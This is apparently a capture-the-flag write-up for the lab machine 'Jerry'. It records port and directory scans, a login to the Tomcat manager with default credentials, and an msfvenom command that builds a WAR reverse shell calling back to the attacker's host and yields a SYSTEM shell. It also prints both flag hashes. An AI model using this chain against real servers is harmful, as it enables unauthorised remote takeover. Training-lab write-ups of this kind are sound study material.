Jerry IP:10.10.10.95


rustscan:
Open 10.10.10.95:8080



nmap:
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88


 gobuster dir  -u http://10.10.10.95:8080  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64      
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.95:8080
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/01/30 07:37:44 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
/con (Status: 200)
===============================================================
2023/01/30 07:44:19 Finished
===============================================================




Visiting the page on port 8080/manager gives us a  log in

by trying different default pass and user combination, the site gives an error that is very detailed:


<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>

this suggests that user and pass are tomcat / s3cret


the same result is verified by msfconsole module: msf6 auxiliary(scanner/http/tomcat_mgr_login) 


[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret


we are in!

Server Information
Tomcat Version	JVM Version	JVM Vendor	OS Name	OS Version	OS Architecture	Hostname	IP Address
Apache Tomcat/7.0.88	1.8.0_171-b11	Oracle Corporation	Windows Server 2012 R2	6.3	amd64	JERRY	10.10.10.95

we can get a reverse shell using a war file

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f war -o backdoor.war 
Payload size: 1098 bytes
Final size of war file: 1098 bytes
Saved as: backdoor.war

upload the file and deploy it, then click on the name of the file in order to catch the rev shell
nc -lnvp 4444       
listening on [any] 4444 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.95] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>


C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e







